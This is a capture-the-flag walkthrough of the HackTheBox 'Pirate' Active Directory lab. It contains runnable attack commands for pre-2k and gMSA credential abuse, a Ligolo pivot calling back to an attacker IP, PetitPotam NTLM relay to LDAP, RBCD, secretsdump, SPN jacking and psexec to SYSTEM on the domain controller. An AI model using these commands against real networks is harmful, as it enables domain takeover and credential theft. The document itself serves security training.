# HackTheBox - Pirate (Hard) - Complete Writeup

**OS:** Windows Server 2019 (Active Directory)  
**Difficulty:** Hard  
**Author:** HTB  
**Date:** March 4, 2026  

## Attack Chain Summary

```
Pre-2k Accounts → gMSA Password Read → Ligolo Pivot → PetitPotam Coercion 
→ NTLM Relay to LDAP (--remove-mic) → RBCD → Secretsdump WEB01 
→ a.white cleartext password → ForceChangePassword a.white_adm 
→ SPN Jacking → Constrained Delegation w/ Protocol Transition → Domain Admin
```

## Network Topology

```
┌─────────────┐         ┌──────────────────────┐         ┌─────────────────┐
│   KALI      │         │       DC01           │         │     WEB01       │
│ 10.10.xx.xx │────────▶│ 10.129.x.x           │         │ 192.168.100.2   │
│             │  VPN    │ 192.168.100.1         │◀───────▶│ Server Core     │
│             │◀────────│ (Dual-homed)          │ Internal│ SMB Signing OFF │
│             │  Direct │                      │  Network│                 │
│             │◀────────────────────────────────────────────┘                 
│             │  WEB01 can reach Kali directly via 10.10.xx.xx
└─────────────┘         └──────────────────────┘         
```

---

## 1. Enumeration

### Port Scan

```bash
nmap -sC -sV -p- <TARGET_IP>
```

Key services on DC01:
- 53 (DNS), 88 (Kerberos), 135 (RPC), 389/636 (LDAP/S)
- 445 (SMB - signing **required**), 5985 (WinRM)

### Initial Credentials

Provided credentials: `pentest:<REDACTED>`

### Key Findings

- LDAP signing **NOT enforced** on DC01
- SMB signing **required** on DC01 but **NOT required** on WEB01

---

## 2. Pre-Windows 2000 Machine Accounts

Using NetExec's `pre2k` module, two computer accounts were discovered with default passwords:

```bash
nxc smb <TARGET_IP> -u pentest -p '<PASSWORD>' -M pre2k
```

| Account | Password |
|---------|----------|
| MS01$   | ms01     |
| ES01$   | es01     |

---

## 3. gMSA Password Retrieval

MS01$ has `msDS-AllowedToRetrieveManagedPassword` for gMSA accounts. First, obtain a TGT for MS01$:

```bash
getTGT.py 'pirate.htb/MS01$:ms01' -dc-ip <TARGET_IP>
export KRB5CCNAME=MS01\$.ccache
```

Then read gMSA passwords:

```bash
nxc ldap <TARGET_IP> -u 'MS01$' -p 'ms01' --gmsa
```

| gMSA Account       | NT Hash                          |
|--------------------|----------------------------------|
| gMSA_ADFS_prod$    | `<REDACTED>` |
| gMSA_ADCS_prod$    | `<REDACTED>` |

---

## 4. Pivoting with Ligolo-ng

### Discovering the Internal Network

Connecting to DC01 with gMSA_ADFS_prod$ reveals a dual-homed configuration:

```bash
evil-winrm -i <TARGET_IP> -u 'gMSA_ADFS_prod$' -H '<GMSA_HASH>'
```

DC01 has a second NIC on `192.168.100.1/24`.

### Setting Up the Tunnel

**Kali (proxy):**
```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 192.168.100.0/24 dev ligolo
./proxy -selfcert -laddr 0.0.0.0:11601
```

**DC01 (agent):**
```powershell
.\.agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert
```

**Ligolo console:**
```
session    # select DC01 session
start
listener_add --addr 192.168.100.1:11601 --to <ATTACKER_IP>:11601
```

### Internal Network Discovery

```bash
nmap -sV -p 445,80,5985,135 192.168.100.2
```

WEB01 (192.168.100.2):
- Windows Server 2019 Build 17763 (Server Core)
- **SMB signing disabled** ← relay target
- IIS running on port 80
- WinRM on 5985

---

## 5. NTLM Relay: PetitPotam Coercion → LDAP

### Critical Discovery

WEB01 can reach Kali's VPN IP directly - no need to relay through DC01:

```powershell
# From WEB01 via evil-winrm
$t = New-Object Net.Sockets.TcpClient
$t.Connect("<ATTACKER_IP>", 445)
# Result: OPEN
```

### Setting Up the Relay

**Step 1 - Stop Kali's SMB service:**
```bash
sudo systemctl stop smbd nmbd
```

**Step 2 - Start ntlmrelayx targeting LDAP on DC01:**
```bash
sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py \
  -t ldap://192.168.100.1 \
  --remove-mic \
  --no-wcf-server \
  -smb2support \
  -i
```

The `--remove-mic` flag is essential for cross-protocol SMB→LDAP relay.  
The `-i` flag opens an interactive LDAP shell.

**Step 3 - Coerce WEB01 to authenticate to Kali:**
```bash
python3 PetitPotam.py \
  -u 'gMSA_ADFS_prod$' \
  -hashes ':<GMSA_HASH>' \
  -d pirate.htb \
  <ATTACKER_IP> 192.168.100.2
```

### Result

```
[*] (SMB): Authenticating PIRATE/WEB01$ against ldap://192.168.100.1 SUCCEED
[*] Started interactive Ldap shell via TCP on 127.0.0.1:11000
```

---

## 6. RBCD Configuration via LDAP Shell

Connect to the interactive LDAP shell:

```bash
nc 127.0.0.1 11000
```

Configure Resource-Based Constrained Delegation - allow MS01$ to impersonate users on WEB01$:

```
# set_rbcd WEB01$ MS01$
Found Target DN: CN=WEB01,CN=Computers,DC=pirate,DC=htb
Found Grantee DN: CN=MS01,CN=Computers,DC=pirate,DC=htb
Delegation rights modified successfully!
MS01$ can now impersonate users on WEB01$ via S4U2Proxy
```

---

## 7. S4U2Proxy → Administrator on WEB01

Request a service ticket impersonating Administrator for CIFS on WEB01:

```bash
sudo ntpdate -u <TARGET_IP>  # sync clock first

python3 getST.py \
  -spn cifs/WEB01.pirate.htb \
  -impersonate Administrator \
  -dc-ip 192.168.100.1 \
  'pirate.htb/MS01$:ms01'
```

```
[*] Saving ticket in Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
```

---

## 8. Secretsdump WEB01 → a.white Credentials

```bash
export KRB5CCNAME=Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache

python3 secretsdump.py -k -no-pass -target-ip 192.168.100.2 WEB01.pirate.htb
```

### Key Findings

| Secret | Value |
|--------|-------|
| Local Admin hash | `<REDACTED>` |
| WEB01$ hash | `<REDACTED>` |
| **a.white cleartext** | **`<REDACTED>`** |

The cleartext password was stored in LSA Secrets (`DefaultPassword` - likely auto-logon configured).

---

## 9. ForceChangePassword: a.white → a.white_adm

BloodHound shows `a.white` has `ForceChangePassword` rights over `a.white_adm`.

```bash
net rpc password 'a.white_adm' '<NEW_PASSWORD>' \
  -U 'pirate.htb/a.white%<PASSWORD>' \
  -S 192.168.100.1
```

Verify:
```bash
nxc smb 192.168.100.1 -u 'a.white_adm' -p '<NEW_PASSWORD>' -d pirate.htb
# [+] pirate.htb\a.white_adm:<NEW_PASSWORD>
```

---

## 10. Constrained Delegation + SPN Jacking → Domain Admin

### Delegation Discovery

```bash
python3 findDelegation.py 'pirate.htb/a.white_adm:<PASSWORD>' -dc-ip 192.168.100.1
```

```
a.white_adm  Person  Constrained w/ Protocol Transition  HTTP/WEB01.pirate.htb
```

`a.white_adm` can delegate to `HTTP/WEB01.pirate.htb` with protocol transition.  
`a.white_adm` also has **WriteSPN** rights on `DC01$`.

### SPN Jacking

Move the `HTTP/WEB01.pirate.htb` SPN from WEB01$ to DC01$:

```python
import ldap3

server = ldap3.Server('192.168.100.1', get_info=ldap3.ALL)
conn = ldap3.Connection(server, user='pirate.htb\\a.white_adm', 
                        password='<PASSWORD>', authentication=ldap3.NTLM, auto_bind=True)

# Remove SPN from WEB01$
conn.modify('CN=WEB01,CN=Computers,DC=pirate,DC=htb', 
    {'servicePrincipalName': [(ldap3.MODIFY_DELETE, ['HTTP/WEB01.pirate.htb'])]})

# Add SPN to DC01$
conn.modify('CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb', 
    {'servicePrincipalName': [(ldap3.MODIFY_ADD, ['HTTP/WEB01.pirate.htb'])]})
```

Now the KDC thinks `HTTP/WEB01.pirate.htb` lives on DC01.

### KCD with altservice

```bash
python3 getST.py \
  -spn HTTP/WEB01.pirate.htb \
  -impersonate Administrator \
  -altservice CIFS/DC01.pirate.htb \
  -dc-ip 192.168.100.1 \
  'pirate.htb/a.white_adm:<PASSWORD>'
```

```
[*] Changing service from HTTP/WEB01.pirate.htb@PIRATE.HTB to CIFS/DC01.pirate.htb@PIRATE.HTB
[*] Saving ticket in Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
```

The ticket is encrypted with DC01's key, so DC01 accepts it as valid.

---

## 11. SYSTEM Shell on DC01

```bash
export KRB5CCNAME=Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache

python3 psexec.py -k -no-pass \
  -dc-ip 192.168.100.1 \
  -target-ip 192.168.100.1 \
  pirate.htb/Administrator@DC01.pirate.htb
```

```
Microsoft Windows [Version 10.0.17763.8385]
C:\Windows\system32> whoami
nt authority\system
```

---

## Flags

| Flag | Hash |
|------|------|
| User (a.white on WEB01) | `<REDACTED>` |
| Root (Administrator on DC01) | `<REDACTED>` |

---

## Credentials Collected

| Account | Type | Value |
|---------|------|-------|
| pentest | Password | `<REDACTED>` |
| MS01$ | Password | `<REDACTED>` |
| ES01$ | Password | `<REDACTED>` |
| gMSA_ADFS_prod$ | NT Hash | `<REDACTED>` |
| gMSA_ADCS_prod$ | NT Hash | `<REDACTED>` |
| WEB01 Local Admin | NT Hash | `<REDACTED>` |
| WEB01$ | NT Hash | `<REDACTED>` |
| a.white | Password | `<REDACTED>` |
| a.white_adm | Password | `<REDACTED>` |

---

## Key Takeaways

1. **Network connectivity testing is crucial** - WEB01 could reach Kali directly, bypassing the need for complex port forwarding through DC01
2. **`--remove-mic` is essential** for cross-protocol SMB→LDAP relay on Windows Server 2019
3. **DefaultPassword in LSA Secrets** - auto-logon credentials are stored in cleartext
4. **SPN Jacking** - if you have WriteSPN on a target, you can redirect constrained delegation to any service on that target by moving the SPN
5. **`-altservice` in getST.py** - allows rewriting the service name in the ticket, turning an HTTP ticket into a CIFS ticket for psexec access
